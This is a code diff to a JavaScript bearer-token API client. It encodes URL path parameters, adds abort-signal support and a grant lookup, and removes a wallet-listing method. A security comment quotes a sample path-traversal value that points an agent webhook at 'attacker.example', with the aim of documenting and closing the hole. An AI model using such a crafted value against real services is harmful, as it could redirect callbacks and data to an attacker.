@@ -10,6 +10,19 @@
 // AUTH IS PASS-THROUGH, NEVER STORED: the bearer token lives only in the
 // arguments of these functions and the Authorization header of the
 // outbound fetch. Nothing here logs it, persists it, or returns it.
+//
+// SECURITY: every value interpolated into a URL PATH (never the query
+// string, which URLSearchParams already percent-encodes) goes through
+// encodeURIComponent, full stop -- no exceptions, no "this one's already
+// validated upstream so it's fine." A 2026-09-18 security review found
+// `updateCard`'s un-encoded `cardId` let a crafted `card_id` like
+// `../agents/callback?webhook=https://attacker.example/hook` turn a PATCH
+// to `/api/v1/cards/:id` into a PATCH to `/api/v1/agents/callback` instead
+// -- a path-traversal that could have pointed a REAL agent's webhook at an
+// attacker's server. encodeURIComponent alone closes that (it escapes `/`
+// and `?`), and src/keyless-tools.mjs's assertPlainId adds a second,
+// independent layer (refusing anything that isn't a bare UUID/integer
+// BEFORE it ever reaches here) -- belt and suspenders, not either/or.
 
 /** Mirrors salt-agent-sdk's SaltApiError shape (status + body + one-sentence message). */
 export class SaltBearerApiError extends Error {
@@ -29,7 +42,7 @@ export function createSaltBearerClient({ host, fetchImpl }) {
   const base = host.replace(/\/$/, "");
   const doFetch = fetchImpl ?? fetch;
 
-  async function request(method, path, bearerToken, body) {
+  async function request(method, path, bearerToken, body, { signal } = {}) {
     const url = `${base}${path}`;
     const headers = { Authorization: `Bearer ${bearerToken}` };
     if (body !== undefined) headers["Content-Type"] = "application/json";
@@ -37,6 +50,7 @@ export function createSaltBearerClient({ host, fetchImpl }) {
       method,
       headers,
       body: body !== undefined ? JSON.stringify(body) : undefined,
+      signal,
     });
     let parsed;
     const text = await res.text().catch(() => "");
@@ -76,7 +90,7 @@ export function createSaltBearerClient({ host, fetchImpl }) {
 
     /** A single chat's members (with public keys) and session metadata. */
     async getChat(bearerToken, chatId) {
-      return request("GET", `/api/v1/chats/${chatId}`, bearerToken);
+      return request("GET", `/api/v1/chats/${encodeURIComponent(chatId)}`, bearerToken);
     },
 
     /** Post a ciphertext message. No senderMessage -- a keyless agent has no private key to read one back with. */
@@ -89,16 +103,34 @@ export function createSaltBearerClient({ host, fetchImpl }) {
     },
 
     async updateCard(bearerToken, cardId, blocks) {
-      return request("PATCH", `/api/v1/cards/${cardId}`, bearerToken, { blocks });
+      return request("PATCH", `/api/v1/cards/${encodeURIComponent(cardId)}`, bearerToken, { blocks });
     },
 
     /**
      * Short-poll the socket-mode outbox (K2 contract). `timeoutSeconds` is
-     * clamped server-side to 0..2 regardless of what's asked here.
+     * clamped server-side to 0..2 regardless of what's asked here. `signal`
+     * (an AbortSignal) lets a caller stop an in-flight poll -- see
+     * keyless-tools.mjs's pollForCardInteraction, wired in src/http.mjs to
+     * the MCP request's own `res.on("close")`.
      */
-    async agentUpdates(bearerToken, { after = 0, timeoutSeconds = 2, limit = 50 } = {}) {
+    async agentUpdates(bearerToken, { after = 0, timeoutSeconds = 2, limit = 50, signal } = {}) {
       const qs = new URLSearchParams({ after: String(after), timeout: String(timeoutSeconds), limit: String(limit) });
-      return request("GET", `/api/v1/agent/updates?${qs}`, bearerToken);
+      return request("GET", `/api/v1/agent/updates?${qs}`, bearerToken, undefined, { signal });
+    },
+
+    /**
+     * This connection's own OAuth grant: the scopes the human approved and
+     * the wallet(s) they explicitly attached to it, per chain/testnet
+     * (`{scopes: string[], wallets: [{id, chain, testnet, label}]}`).
+     * THIS is also how src/http.mjs validates a bearer token is real --
+     * see createTokenValidator -- so it doubles as this connection's one
+     * source of truth for which wallet a money tool may use. A keyless
+     * agent owns no wallet of its own (see the header comment on
+     * pickGrantedWallet in keyless-tools.mjs for why that's permanent, not
+     * a gap to fill in later).
+     */
+    async getGrant(bearerToken, opts) {
+      return request("GET", "/api/v1/oauth2/grant", bearerToken, undefined, opts);
     },
 
     /** A plain (non-itemized) money request, or an itemized invoice when `requestType`/`lineItems` are given. */
@@ -121,11 +153,6 @@ export function createSaltBearerClient({ host, fetchImpl }) {
     async listTransferRequests(bearerToken) {
       const requests = await request("GET", "/api/v1/transfer_requests", bearerToken);
       return Array.isArray(requests) ? requests : [];
-    },
-
-    async listWallets(bearerToken) {
-      const wallets = await request("GET", "/api/v1/wallets", bearerToken);
-      return Array.isArray(wallets) ? wallets : [];
     },
 
     async listProducts(bearerToken, sellerId) {
